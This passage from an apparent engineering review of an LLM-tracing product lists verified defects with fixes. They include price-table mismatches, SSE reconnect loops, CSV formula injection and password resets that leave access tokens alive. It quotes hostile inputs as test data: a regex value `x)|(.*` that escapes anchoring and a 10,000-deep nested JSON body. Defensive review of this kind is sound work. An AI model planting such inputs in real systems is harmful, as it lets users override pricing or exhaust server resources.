**Suggested fix.** Decide it explicitly, either in D98 or with a new D-A2-5 decision, and record it in spec 05 § Sandbox item 8. The recommendation is the OWASP rule: prefix a cell whose first character is one of = + - @ \t \r with a single quote, applied to string cells only and documented as a lossy CSV-only transformation; NDJSON and Parquet stay exact. Add a csv_rows test for each leading character.

**Verifier evidence.** crates/storage/src/sql/encode.rs csv_text and push_csv_field (about lines 155-174) only RFC-4180-quote on '"', ',', CR or LF. Nothing neutralises a leading = + - @ or tab. docs/reviews/a2-query.md:188 raises open question 4. A grep for 'formula' or 'injection' in mvp-decisions, spec 05, spec 09 and plans/h-console finds no decision. Spec 05 § Sandbox item 8 says nothing about CSV cell handling.

### Tracks B1/B2 — normalization and capture

#### B-1 — Built-in price table cannot price Gemini, Azure, xAI or Mistral spans: provider vocabulary mismatch plus collapsed snapshot rows

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** B1
- **References:**
  - docs/plans/b1-normalization/04-media-truncation-cost.md N16 step 2 'Clarification A' (line 169) and N17 conversion rules (lines 224-227)
  - docs/spec/02-ingestion.md:255 (a row with a provider matches only the same provider or no provider)
  - crates/otel/src/cost.rs:355-360 row_matches
  - crates/otel/tests/prices.rs:288-317 convert (one row per model_name) and 369-385 canonical_provider
  - crates/otel/prices/builtin.json: gemini-2.5-pro and gemini-2.5-flash -> provider gcp.vertex_ai only; grok-3 and mistral-large-latest -> azure.ai.openai only; gpt-4o -> openai only
  - crates/otel/src/context.rs:225-262 (alias table has no gemini, google, azure, mistralai, aws)
  - fixtures/otlp/prices.json (no Gemini row, so no golden case prices a Gemini span)

**Problem.** Three choices combine badly:
- **N17 keeps one snapshot row per model name.** On a collision it keeps the key without '/', or else the first key. So the provider kept is arbitrary: gemini-2.5-* is gcp.vertex_ai only, grok-3 and mistral-large-latest are azure.ai.openai only, and gpt-4o is openai only.
- **N16's Clarification A makes the provider match strict.** A row with a provider matches only a span with the same provider or with none.
- **Captured spans carry provider values that no row uses.** The values are gemini (official GenAI and ADK), google (OpenInference) and gcp.gen_ai (OpenLLMetry). The alias table maps none of them, nor OpenInference's azure, mistralai or aws.

The golden suite cannot catch this, because fixtures use prices.json, which has no Gemini row. Every captured Gemini llm span is blessed with cost_source none, and no test runs captured inputs against builtin_price_rows().

**Failure scenario.** In production the server prices spans with builtin_price_rows(). Four cases go wrong:
- A google-genai span (provider gemini, model gemini-2.5-flash, 48 input tokens) matches no row: the only candidate has provider gcp.vertex_ai. Cost is null. The same happens to the 12 captured Gemini spans in genai/, google_adk/, openinference/ and openllmetry/.
- An Azure OpenAI span (provider azure.ai.openai, model gpt-4o) and an xAI span (provider x_ai, model grok-3) also get null cost.
- A span with no provider and model grok-3 gets the provider azure.ai.openai inferred.
- Cost dashboards and budget alerts undercount every non-OpenAI/Anthropic deployment.

**Suggested fix.** 1. Change N17 to keep one row per (model_name, provider): dedupe only identical (pattern, provider, valid_from), and fix the canonical_provider mapping (azure_ai is azure.ai.inference).
2. Extend the rule 12 alias table and spec 02 with the observed values: gemini to gcp.gemini; google and gcp.gen_ai handled explicitly, for example treated as matching gcp.gemini or gcp.vertex_ai rows; azure, mistralai, aws, xai.
3. Decide in spec 02 what happens when no row has the span's provider. One option: fall back to the provider-less or 'home' row and record the choice as a D-B1 decision.
4. Add a test that normalizes every captured input.json with builtin_price_rows() and asserts a non-null cost on llm/embedding spans that have tokens.
5. Add a Gemini row to fixtures/otlp/prices.json so the Gemini thoughts/reasoning cost path has a golden case.

**Verifier evidence.** crates/otel/prices/builtin.json has a single row each for gemini-2.5-flash/pro (provider gcp.vertex_ai), grok-3 and mistral-large-latest (azure.ai.openai) and gpt-4o (openai). crates/otel/tests/prices.rs convert() keys winners by model_name only (BTreeMap<String, Winner>), and canonical_provider maps every azure* to azure.ai.openai. cost.rs row_matches does a strict equality when both sides have a provider, and spec 02 step 2 says the same. context.rs exact_alias maps only openai.chat/openai.responses/anthropic.messages/xai. gemini, google, azure, mistralai and aws are not aliased, and gcp.gen_ai is well-known but no snapshot row uses it. The blessed captured expected.json files show provider gemini (genai/google-genai-*, google_adk/*), google (openinference/google-*) and gcp.gen_ai (openllmetry/google-genai-multimodal), all with cost_source none. fixtures/otlp/prices.json has no Gemini row, and the agent-thoughts notes admit it. No X finding covers this; X29 is only about who owns custom prices.

#### B-2 — Promoted string columns are never truncated, and N23 property 4 was narrowed to skip them

- **Severity:** minor (reviewer: major) · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** B1
- **References:**
  - docs/spec/02-ingestion.md:24 (§ Limits: 'Single attribute value 8 MiB, truncated') vs :247 (§ Truncation lists only input, output, system_instructions, tool_definitions, name, status_message, attributes, events)
  - docs/plans/b1-normalization/04-media-truncation-cost.md N15 'What is checked' (lines 90-95)
  - docs/plans/b1-normalization/06-hardening.md property 4 ('Every stored string field and attribute value is ≤ max_attribute_bytes plus the marker length')
  - crates/otel/src/truncate.rs:350-385 truncate_columns
  - crates/otel/tests/proptest.rs:365-405 check_span (bounds only name, status_message, payload columns, attributes, resource_attributes, events)
  - crates/otel/tests/proptest.rs:59-68 PROMOTED (session.id, user.id, tag.tags, gen_ai.request.model generated with up to 64 KiB text)

**Problem.** Several columns are filled from attribute values but are never cut to max_attribute_bytes:
- session_id, user_id, tags;
- metadata values and request_params;
- request_model, response_model, provider, operation;
- environment, release, service_name, scope_name/version;
- link attributes.

Rule 2 removes a consumed attribute over 256 bytes from `attributes`. So a huge `cetra.metadata.x` or `session.id` survives only in its promoted column, uncut. The proptest generates exactly these keys with 64 KiB values, but its bound check skips those columns. Property 4 of N23 was narrowed without saying so, and the spec's § Limits row ('single attribute value … truncated') is not what the code does.

**Verifier correction.** Promoted string columns (session_id, user_id, tags, metadata values, request_params, model/provider/operation, environment, release, service/scope names, link attributes) are never cut to max_attribute_bytes, and the N23 property 4 check skips them. The fix restores the 8 MiB bound the spec promises. Whether ID-like columns need a much smaller cap is a separate spec question.

**Failure scenario.** A client sends `session.id`, `cetra.metadata.note` or `gen_ai.request.model` with a 9 MiB string. That fits the 10 MiB HTTP or 32 MiB gRPC body.
- The span is stored with a 9 MiB session_id or metadata value, and nothing in `truncated` says so.
- Storage, session listings, filters on session_id and the UI then handle multi-megabyte keys per span.
- The price RegexSet runs over a 9 MiB model string.

**Suggested fix.** 1. In N15/truncate.rs, apply the string rule to every promoted string column, the metadata map values, request_params, tags elements and link attributes. Use the column name (or `metadata.<key>`) in `truncated`.
2. List those columns in spec 02 § Truncation, or state per column why one is exempt.
3. Extend check_span in tests/proptest.rs to bound every String/Option<String>/map field of Span, as property 4 requires.

**Verifier evidence.** truncate.rs:352-385 truncate_columns cuts only name, status_message, attributes, resource_attributes, event attributes, system_instructions and tool_definitions. Input and output are cut elsewhere. No length handling exists for session_id or the other promoted columns (context.rs:174 string_field). proptest.rs check_span bounds only those same fields, although PROMOTED generates session.id, gen_ai.request.model and similar keys, and 06-hardening.md:36 property 4 says 'every stored string field'. Spec 02 rule 2 (line 185) removes a consumed attribute over 256 bytes, so the promoted column is the only copy left. Downgraded to minor: the limit is 8 MiB anyway, so the proposed fix caps a 9 MiB session_id at 8 MiB. That does not remove the 'multi-megabyte keys' harm in the failure scenario, which would need a much smaller per-column cap (a spec decision, not a truncation bug). The real defect is the gap between the code and property 4 / the spec's 'single attribute value' limit.

#### B-3 — R2 re-check against captures left undone: spec still says 'unverified (D113)' and 13 fixtures still say 're-check against a B2 capture'

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** B1
- **References:**
  - docs/plans/b2-capture/README.md:80 (request R2)
  - docs/spec/02-ingestion.md:151-155 (token semantics rows 'pinned by a captured fixture, D113' and 'unverified (D113)')
  - docs/mvp-decisions.md:166 (D113, never annotated as resolved; only D-B1-4 resolves the TTFT part)
  - fixtures/otlp/openllmetry/anthropic-cache-tokens/input.json (gen_ai.usage.input_tokens 2100 = inclusive)
  - fixtures/otlp/google_adk/agent-thoughts/case.json notes (output_tokens 20 = candidates 14 + thoughts 6, inclusive)
  - fixtures/otlp/{vercel/v5-anthropic-exclusive-input,genai/legacy-message-events,openllmetry/chat-anthropic-cache,google_adk/thoughts-tokens,…}/case.json notes ('re-check against a B2 capture'; 13 cases)

**Problem.** R2 asked B1 to confirm or correct each single-source D113 behaviour against the captures, and to update the 're-check' notes. The captures now settle all of them:
- OpenLLMetry Anthropic input is inclusive (2100).
- ADK gen_ai.usage.output_tokens includes thoughts.
- Vercel ≤ v5 + Anthropic is pinned by vercel/v5-anthropic-cache.

Yet spec 02's table still marks two rows 'unverified (D113); treat as yes', D113 still reads 'until B2 captures exist', and 13 hand-written cases still say to re-check. The roadmap marks B1 and B2 Done.

**Failure scenario.** An implementer reading spec 02 treats OpenLLMetry Anthropic and ADK token semantics as open questions. They may add speculative handling or a new capture for a question that is already answered. A reviewer cannot tell which hand-written fixtures are still unconfirmed.

**Suggested fix.** 1. Update spec 02 § Token semantics:
   - OpenLLMetry Anthropic: yes (openllmetry/anthropic-cache-tokens).
   - gen_ai.usage.* on ADK: yes/yes (google_adk/agent-thoughts).
   - Vercel ≤ v5 + Anthropic: cite vercel/v5-anthropic-cache.
2. Annotate D113 as resolved by those captures and D-B1-2/D-B1-4.
3. Rewrite the 13 'notes' fields to name the capture that confirms each one, or say that no capture covers it (for example genai/legacy-message-events).

**Verifier evidence.** Spec 02 lines 151-155 still say 'unverified (D113); treat as yes' for OpenLLMetry Anthropic and for gen_ai.usage.* on ADK. mvp-decisions.md:166 D113 still says 'until B2 captures exist'. The captures settle both: openllmetry/anthropic-cache-tokens input.json has gen_ai.usage.input_tokens 2100 with cache_read 1800 and cache_creation 200 (inclusive), and its notes say 'Covers D113'. google_adk/agent-thoughts notes say output_tokens 20 = 14 + 6 thoughts. vercel/v5-anthropic-cache exists. grep finds exactly 13 case.json files that still say 're-check against a B2 capture'. b2-capture/README.md:80 R2 asked for these updates, and roadmap.md:35-36 marks B1 and B2 Done.

#### B-4 — A price pattern can escape the ^(?i:…)$ anchoring because only the wrapped pattern is validated

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** B1
- **References:**
  - crates/otel/src/cost.rs:107-125 PriceTable::compile (Regex::new(format!("^(?i:{})$", row.match_pattern)))
  - docs/plans/b1-normalization/04-media-truncation-cost.md N16 (lines 154-159; 'patterns come from users through the server')
  - docs/spec/02-ingestion.md:251 ('regex, anchored, case-insensitive')

**Problem.** Only the wrapped string `^(?i:pattern)$` is validated. Take the pattern `x)|(.*`: on its own it is unbalanced and invalid. Wrapped, it becomes `^(?i:x)|(.*)$`, which compiles and matches every model. The N17 test checks for no ^/$ only in the built-in snapshot. The custom-price API (owner still unassigned, X29) will rely on PriceTable::new as its validator.

**Failure scenario.** A user saves a project price row with match_pattern `foo)|(.*`. PriceTable::new accepts it. The project scope has the highest priority, so the row prices every span in the project at that row's prices, and provider inference uses its provider. The intent was to match one model.

**Suggested fix.** In compile, first parse `row.match_pattern` alone (regex_syntax or Regex::new) and reject it with InvalidPattern { index } when that fails. Only then wrap it. Add a unit test with `x)|(.*` and spec 02 wording that a pattern must be a complete regex on its own.

**Verifier evidence.** cost.rs:109-115 validates only format!("^(?i:{})$", row.match_pattern). The pattern `x)|(.*` wrapped gives `^(?i:x)|(.*)$`, which is a valid regex whose second alternative `(.*)$` matches every model. The raw pattern is never parsed alone. Today this is latent: built-in rows are regex::escape'd and the custom-price API has no owner (X29). It becomes reachable once project prices exist.

#### B-5 — The 10 000-level nesting test never reaches serde_json's recursion limit

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** B1
- **References:**
  - docs/plans/b1-normalization/06-hardening.md property 6 ('serde_json's recursion limit must turn that into an error; assert it does')
  - crates/otel/tests/proptest.rs:513-520 deeply_nested_json_is_rejected

**Problem.** The input is `[[[…]]]` decoded as an ExportTraceServiceRequest. Derived serde structs accept sequences, so serde descends request → resourceSpans → ResourceSpans → resource → attributes → KeyValue. At about depth 7 it fails with a type error (a sequence where `key` should be a string). The test only checks for an error with the text 'invalid OTLP JSON', so it passes without touching the recursion limit. Deep nesting where it matters, inside arrayValue/kvlistValue of an AnyValue, is not tested at decode time.

**Failure scenario.** Two kinds of change would pass this test unnoticed:
- a dependency change that disables or raises the recursion limit, for example serde_json's unbounded_depth;
- an AnyValue deserializer that recurses without a bound.

In both cases a crafted 10 000-deep kvlistValue body could overflow the stack.

**Suggested fix.** Build the deep input inside a real AnyValue, for example `{"resourceSpans":[{"scopeSpans":[{"spans":[{"attributes":[{"key":"k","value":{"arrayValue":{"values":[ … ]}}}]}]}]}]}` nested 10 000 times. Assert a JsonErrorCategory and that the decoder returns without a stack overflow.

**Verifier evidence.** proptest.rs:514-521 decodes 10 000 '[' into ExportTraceServiceRequest via decode.rs:17 serde_json::from_slice. In opentelemetry-proto 0.33.1 the types are plain serde derives with no field-level deserialize_with: ExportTraceServiceRequest.resource_spans, then ResourceSpans.resource, then Resource.attributes (first field), then KeyValue.key (String). Derived structs accept sequences, so serde reaches KeyValue.key at about depth 6 and fails with 'invalid type: sequence, expected a string', far below the depth-128 recursion limit. The test only checks 'invalid OTLP JSON', so the recursion limit is never exercised.

#### B-6 — Wrong decision IDs and stale text in B2 plans, tools/README.md and the B1 public API

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** B2
- **References:**
  - docs/plans/b2-capture/README.md:80, 03-genai-openinference.md:29 and :73, 04-vercel.md:73 and :110, 05-other-conventions.md:33 and :106 ('D111' for the single-source behaviours; D111 is rejection reasons, D113 is meant)
  - docs/plans/b2-capture/05-other-conventions.md:69 ('reported-cost (D107)'; D107 is AnyValue limits, D109 is reported cost)
  - tools/README.md:11 ('The recipes arrive with the tool, in K9–K10'; they exist)
  - docs/plans/b1-normalization/README.md § Public API (omits the exported JsonErrorCategory, crates/otel/src/lib.rs:28)

**Problem.** B2 plans cite D111 eight times where they mean D113, and cite D107 where they mean D109. The fixtures themselves correctly say 'Covers D113'. tools/README.md still describes the recipes as future work. B1's README calls itself 'the whole public surface' of cetra-otel but leaves out a public enum.

**Verifier correction.** B2 plans cite D111 seven times (not eight) where D113 is meant.

**Failure scenario.** A later track reuses the B2 scenario conventions or rereads K18 and follows the D111/D107 pointers to rejection reasons and AnyValue limits instead of D113/D109. A reader of tools/README.md thinks capture is not implemented yet.

**Suggested fix.** Replace D111 with D113 and D107 with D109 in docs/plans/b2-capture. Reword tools/README.md:11 to plain present tense. Add JsonErrorCategory to the B1 README § Public API.

**Verifier evidence.** grep finds 7 occurrences of D111 in docs/plans/b2-capture (README:80, 03:29, 03:73, 04:73, 04:110, 05:33, 05:106), not 8. D111 is 'Rejection reasons are a closed set' (mvp-decisions.md:164), and D113 is meant. 05-other-conventions.md:69 says 'reported-cost (D107)': D107 is AnyValue limits and D109 is reported cost. tools/README.md:11 still says 'The recipes arrive with the tool, in K9–K10'. lib.rs:27 exports JsonErrorCategory, but b1-normalization/README.md § Public API (line 89, 'The whole public surface') does not mention it.

### Track C — web UI

#### C-1 — The web SSE client reconnects forever after any HTTP error, which contradicts D-G-22 and D-L-1; the client fix G required from C was never made

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** C (web/src/lib/sse.ts and traces list), with a G/coordinator note on D-G-22 and the skipped M5 check
- **References:**
  - web/src/lib/sse.ts:73-85 (fail: always closes, then reconnects with backoff capped at 30 s)
  - web/src/lib/sse.ts:109-114 (any 'error' calls fail())
  - web/src/routes/$org/$project/traces/index.tsx:199-212 (url is built from liveOn alone; filterError only gates `ready`)
  - web/src/components/trace/trace-view.tsx:82-110 (follow stream; same wrapper)
  - docs/mvp-decisions.md D-G-22 ('an invalid filter answers 400 invalid_filter ... so EventSource closes without retrying')
  - docs/plans/g-spine/00-design.md:262 ('The client must pass search, not open a stream while the filter is invalid ...' needed before M5) and :267 ('M5's plan starts by checking the C fixes')
  - docs/plans/g-spine/05-m5-ui-and-e2e.md (no check of the C fixes)
  - docs/plans/c-fixes/README.md ('The review's minor findings are out of scope')
  - docs/reviews/c-web-ui.md minor 6 and § Mock-only behaviour ('reconnect after an HTTP error (401, 404, 429) is never exercised')
  - docs/spec/11-ui.md § Signed out (D-L-1: a 401 from /api/v1/* redirects to /login)
  - docs/mvp-decisions.md D-L-1 / README D-L-1 ('their 401 is handled when the next list refetch fails')
  - web/src/lib/sse.ts:45-120 (error → fail() → backoff retry; resync only on a successful reopen)
  - web/src/api/client.ts:29-37 (refetchOnWindowFocus: false, staleTime 30 s)
  - docs/plans/g-fixes/02-stream-lifetime.md:5-8 (streams end after 15 min; 'reconnect … authenticates again … resync … refetches')
  - web/src/api/session.ts:37-44 (middleware sees only fetch calls)

**Problem.** The G design made 'do not open a stream while the filter is invalid' a client prerequisite for G M5, and D-G-22 records that a 400 at open makes EventSource stop. But the c-fixes plan fixed only the majors, so minor 6 was dropped, and G's M5 plan never ran the C-fixes check its design promised. On main, the traces list still opens `/traces/stream` while the list shows `invalid_filter`. `openStream` treats every `error` event the same way: a 400, 401, 403 or 404 before the first `open`, or a dropped connection. It closes the EventSource and reconnects with exponential backoff, forever. A native EventSource closes for good on a non-200 answer; the wrapper reopens it. Stream errors also never pass through the API client's 401 handling, so an expired session is not detected by the stream.

**Merged.** Also reported by the L reviewer as L-5: when a session expires on an idle live list, every reconnect fails with 401, `resync` never fires (it runs only on `open`), window-focus refetch is off, so D-L-1's "next list refetch" never comes and the user is never sent to `/login`.

**Failure scenario.** 1. A user has `?live=1&filter=bad` (or types an invalid filter while live). The list shows the filter error. The live dot shows 'retrying' forever, and the browser sends a GET that fails with 400 every 30 s until the tab closes. This is the exact behaviour D-G-22 says cannot happen.
2. A user leaves a recent trace open in the full-page view. Their session expires or their role is removed. `/traces/{id}/stream` answers 401 or 403, the view keeps showing 'retrying' and polling, and it never redirects to /login as D-L-1 requires.
3. A deep link to a deleted trace that ended under 10 minutes ago retries its 404 stream forever.

**Suggested fix.** C:
- In traces/index.tsx, pass `url: undefined` while `filterError` is set (and while the list has any 4xx).
- In lib/sse.ts, when an EventSource errors before its first `open`, do not blindly reconnect. Probe the URL once through the API client (or `fetch` with credentials) to read the problem. Stop with status 'closed' for a 4xx other than 429, and route a 401 to the app's existing 401 handler. Keep backoff for network errors, 429 and 5xx.
- Tests with the test EventSource polyfill: an error before open, followed by a 400 probe, stops without a retry timer; a 401 navigates to /login; an invalid filter opens no stream.
- Correct D-G-22's 'EventSource closes without retrying' wording if the client behaviour differs.

Coordinator: G M5's 'check the C fixes' step was skipped. Record that minor 6 was a prerequisite, not backlog.

**Verifier evidence.** web/src/routes/$org/$project/traces/index.tsx builds the `url` passed to useLiveTraces from `liveOn` alone: `liveOn = search.live === 1 && reason === undefined && !hold`. `filterError` only gates `ready`, and `ready` only controls the scroll listener (use-live-traces.ts:216). useStream opens the stream whenever `url` is set (sse.ts:175-197). In sse.ts:109-114, every 'error' event calls fail() (73-85), which closes the EventSource and schedules a reconnect with backoff capped at 30 s. Nothing checks the status code, stops for good, or hands a 401 to the API client. D-G-22 (mvp-decisions.md:331) says that with a 400 at open, 'EventSource stops instead of retrying'. This wrapper reopens it. The G design (00-design.md, the C U27 row) requires the client to 'not open a stream while the filter is invalid' before M5, and says 'M5's plan starts by checking the C fixes'. 05-m5-ui-and-e2e.md never mentions the C fixes. c-fixes/README.md:5 puts the minors out of scope, and review minor 6 (c-web-ui.md) is exactly this bug. The roadmap C row calls the minors 'a backlog'. The 401 and 404 scenarios follow from the same unconditional fail(). I did not trace whether another query on the page would trigger the 401 redirect first, so that part is plausible rather than proven. No cross-track X finding covers it.

#### C-2 — D-C-4's 'refetch page 1' cancels its own in-flight refetch on every new event, so live mode can stop updating on busy projects

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** C
- **References:**
  - web/src/components/data-table/use-live-traces.ts:97-103 (refetchFirstPage: setQueryData(firstPageOnly) then invalidateQueries with default options)
  - web/src/components/data-table/use-live-traces.ts:196-199 (each at-top trace event while page 1 is full calls refetchFirstPage)
  - web/src/components/data-table/use-live-traces.ts:159-161 (each resync calls it too)
  - docs/plans/c-fixes/06-live.md § CF9 Changes 2c/2e (the plan prescribes exactly this helper)
  - docs/mvp-decisions.md D-C-4, D-G-13/D-G-31 (the stream sends resync whenever a tick touches more than 500 traces)
  - web/src/routes/$org/$project/traces/index.test.tsx:817 (the cap test runs only on an instant mock with one event)

**Problem.** CF9 makes every live insert that would push page 1 past 500 rows call `refetchFirstPage()`, and so does every `resync`. That helper calls `queryClient.invalidateQueries({queryKey, exact: true})`, whose `cancelRefetch` defaults to true in TanStack Query v5. While the refetch is in flight, page 1 still holds 500 rows (`firstPageOnly` keeps them), so every later trace event and every resync cancels the fetch and starts a new one. The server sends trace events in batches once a second (D-G-13). If the list read takes longer than the gap between batches, the refetch never completes. That is plausible for a 24 h range at volume, since D-G-14 allows 30 s reads. The 500-cap and the >500-touched-traces resync both hit exactly on the busy projects the cap was designed for. The tests use an instant mock and a single event, so they cannot catch it.

**Failure scenario.** A project receives about 20 traces/s and the user leaves the traces list live at the top. Within half a minute page 1 reaches 500 rows. From then on every one-second batch calls `invalidateQueries` about 20 times, each cancelling the previous request. When `GET /traces` takes over 1 s, no refetch completes. The list freezes on the old 500 rows, no new rows appear, and the status dot still says 'open'. The same loop runs on a project where more than 500 traces change per tick: every tick is a `resync`, and the first-page refetch is restarted every second.

**Suggested fix.** In `refetchFirstPage`:
- skip the invalidate when `queryClient.isFetching({ queryKey: key, exact: true }) > 0`, or pass `{ cancelRefetch: false }` so an in-flight refetch is reused;
- optionally coalesce to at most one refetch per second.

Add a page test: hold the list handler on a promise, emit several traces and a resync while page 1 is at a lowered cap, and assert one `/traces` request, then the refreshed page after release.

Record the 'one in-flight refetch' rule in D-C-4 and spec 11 § Live mode.

**Verifier evidence.** use-live-traces.ts refetchFirstPage calls setQueryData(firstPageOnly) and then `invalidateQueries({queryKey: key, exact: true})` with no options. In @tanstack/query-core 5.105.3 (web/package.json pins 5.105.3), queryClient.js:346 documents 'By default (`cancelRefetch: true`), a currently running fetch is cancelled before the new one starts'. While the refetch runs, page 1 still holds the capped rows, so `firstPageWouldExceed(current, 1, limits.page)` (live-list.ts:22) stays true. Every later at-top trace event, every insertBuffered overflow and every `resync` (onEvent) calls refetchFirstPage again, which cancels the running fetch. Per D-G-13 the server sends a batch once a second, and sends resync when a tick touches more than 500 traces. So once a first-page read takes longer than about 1 s, the refetch never completes while traffic continues and the status stays 'open'. This is conditional on slow reads under steady load, but that is exactly the case the cap exists for.

#### C-3 — Four product questions from the C review still have no decision; the onboarding trigger keeps telling active projects to 'send your first trace'

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** Coordinator (decisions), C (spec 11 text)
- **References:**
  - docs/reviews/c-web-ui.md § Open questions 1, 2, 5, 6 (U8 gate, onboarding trigger, saved-view actions vs spec, typed durations)
  - web/src/components/onboarding/state.ts:4-14 (onboarding whenever the preset range is empty and nothing else is set)
  - docs/spec/11-ui.md:39 (spec still lists 'share with project, set as my default / project default' on the Views dropdown)
  - docs/spec/11-ui.md:66 ('Empty state: onboarding snippets ...', no trigger defined)
  - docs/roadmap.md track C row ('The 27 minors are a backlog'; the open questions are not mentioned)
  - docs/plans/c-fixes/README.md § Decisions (D-C-1..5 cover only questions 3 and 4)

**Problem.** The c-fixes decisions settled only the live-search and live-caps questions (D-C-4, D-C-5). The others were not recorded as decisions, assigned to a track or put in the roadmap:
- whether U8 happened;
- what triggers onboarding;
- whether spec 11 or the menu is right about sharing and the project default on an existing view;
- whether a typed duration stays relative.

Spec 11 still describes a saved-views menu that main does not build, and says nothing about when onboarding shows. The code shows it for 'no traces in the selected preset range'.

**Verifier correction.** The open questions on the U8 gate, the onboarding trigger, typed durations and saved-view actions have no recorded decision or owner. Spec 11:39 lists saved-view actions ('share with project' on an existing view, 'set as my default / project default') that differ from the menu, which offers sharing only as a save-time flag and has a single 'set as default' for an owned view. Spec 11 does not define when onboarding shows.

**Failure scenario.** A self-hosted user whose project last ingested 2 days ago opens the traces list (24h default). They see 'Send your first trace' with SDK snippets and a 5 s poll that runs forever, instead of an empty list with a range hint. An implementer reading spec 11 for saved views adds 'set as project default' on existing views without knowing the menu deliberately differs, or a reviewer files it as a regression.

**Suggested fix.** The coordinator records decisions (D-C-6 onward or plain numbers) for:
- the onboarding trigger, for example a cheap `limit=1` probe over the retention window, or a `first_seen` on `get_project`, with the owning track;
- the saved-view actions: align spec 11 line 39 with the menu, or plan the missing actions;
- typed durations;
- the U8 gate record.

List the remaining C minors with an owner in the roadmap row.

**Verifier evidence.** mvp-decisions.md holds only D-C-1..D-C-5 (lines 298-302): OR chips, default view, chart keyboard, live caps and live search. None covers the U8 gate, the onboarding trigger, saved-view actions or typed durations (c-web-ui.md Open questions 1, 2, 5, 6). No decision mentions an onboarding trigger. onboarding/state.ts shows onboarding whenever the preset range is empty and no filter, search or toggle is set. spec 11:66 gives no trigger. The roadmap C row (line 37) says only 'The 27 minors are a backlog', with no owners and no mention of the open questions. One partial correction on saved views: saved-views-menu.tsx does have 'Share with project' (a flag at save time, line 198) and a 'set as default' action for an owned current view (lines 158-162). So the gap against spec 11:39 is narrower than 'a menu main does not build'. It is about sharing an existing view and a project-wide default as separate actions.

### Tracks D/E — metadata, auth and eval library

#### DE-1 — Track D's P26 independent security review was never done, yet D is marked Done

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** D (coordinator schedules it)
- **References:**
  - docs/plans/d-meta-auth/07-security-review.md (Edit only: docs/research/auth/review-<date>.md; Report: 'Any critical or high finding that is not fixed blocks marking track D done')
  - docs/plans/d-meta-auth/README.md:167 (P26 must be the last sub-phase)
  - docs/roadmap.md:38 (D row: P1–P26, **Done.**, PRs #21, #25)
  - git log f432ad2^2 ^f432ad2^1: 1da749a…d700058 cover P1–P25; no 'server: fix findings of the auth security review' or 'docs: record the auth security review' commit
  - docs/research/auth/: only advisories.md, langfuse.md, langwatch.md, opik.md, phoenix.md, README.md; no review-*.md

**Problem.** PR #25 holds one commit for each of P1 to P25, ending at d700058 'link identities and provision OAuth users'. P26's deliverable is missing: no findings file exists under docs/research/auth/ and no review commit exists anywhere in history. The roadmap still lists the track as P1–P26 and marks it Done, but P26 itself says D cannot be marked done until it runs. Since D landed, many tracks have added routes to D's table: G, H, I, K, M and P added OTLP, MCP, SQL, alert, deletion, entitlement, control-plane and internal-org routes. So checklist items 10–17 (route-table completeness, IDOR on path ids, the access-suite coverage) were never checked by an independent reviewer.

**Failure scenario.** An auth gap that P26's checklist targets ships unreviewed. DE-2 is one example: password reset leaves PATs alive (checklist items 4–5 and 14). Another would be a later route whose {id} is not tied to the resolved org. Readers of the roadmap believe the independent review happened.

**Suggested fix.** Run P26 now against current main, using a model other than the one that implemented D. Extend checklist item 17 to every RouteDef in routes(), including Key, Pat, ControlPlane and undocumented routes. Record the results in docs/research/auth/review-<date>.md. Until that is done, change the D row in docs/roadmap.md to 'Done except P26' and fix the stale status line in the README.

**Verifier evidence.** docs/research/auth/ holds only advisories.md, langfuse.md, langwatch.md, opik.md, phoenix.md and README.md. No branch in history has ever added a research/auth/review-* or reviews/d-* file (git log --all --name-only), and no commit subject mentions a security review. 07-security-review.md:71 says 'Any critical or high finding that is not fixed blocks marking track D done'. roadmap.md:38 marks D (P1–P26) '**Done.**'. The cross-track review has no matching X finding.

#### DE-2 — Password reset revokes sessions but not personal access tokens

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** security-privacy · **Owner:** D (auth follow-up)
- **References:**
  - crates/server/src/routes/auth.rs:320-370 (reset_password: set_password_hash, delete_user_sessions, delete_user_resets; no revoke_user_tokens, no pat_cache eviction)
  - crates/server/src/routes/me.rs:136-144 (password change: revoke_user_tokens + pat_cache.evict)
  - crates/server/src/auth/oidc/flow.rs:473-474 and :404 (linking revokes PATs and evicts)
  - docs/spec/08-auth.md:29-30 (change revokes PATs; reset revokes only web sessions)
  - docs/mvp-decisions.md D146, D148

**Problem.** Changing the password while signed in (D146) and linking an OIDC identity (D148) both revoke every PAT and evict them from the 60 s PAT cache. The forgot-password and admin reset-link flow, POST /api/auth/password/reset, only deletes web sessions. Spec 08 line 30 encodes the same gap. Reset is the main recovery path after an account compromise, so it is the flow where PAT revocation matters most.

**Failure scenario.** An attacker learns Ada's password, logs in, and creates a `read, write` PAT with no expiry; PAT creation is session-only, and the attacker has a session. Ada notices and uses 'forgot password' (or an admin sends her a reset link). Her sessions are deleted, but the attacker's PAT keeps reading and writing every project Ada can reach until someone revokes it by hand.

**Suggested fix.** Inside the reset transaction, call personal_tokens::revoke_user_tokens and evict the returned hashes from state.pat_cache after the commit, as me.rs does. Amend spec 08 line 30 to say 'Resetting revokes all of the user's web sessions and personal access tokens', add the change to D146 (or a new D-<track> decision), and add a routes::auth test: a PAT made before the reset gets 401 right after it.

**Verifier evidence.** In crates/server/src/routes/auth.rs, reset_password (around lines 320-370) runs only set_password_hash, delete_user_sessions and delete_user_resets inside its write. revoke_user_tokens and pat_cache.evict appear only in me.rs:139/144 (password change) and tokens.rs:167. Spec 08 says change revokes sessions and PATs, while reset with SMTP revokes only web sessions, so the gap is also written into the spec. A PAT created by an attacker survives the recovery flow.

#### DE-3 — E20's 'Needs a decision' items were never decided or assigned; quota handling contradicts spec 06

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** coordinator → I
- **References:**
  - docs/plans/e-eval/README.md:165-170 (Needs a decision: D166 edge ranges, D160 quota, webhook categorical, header precedence, D164 wording)
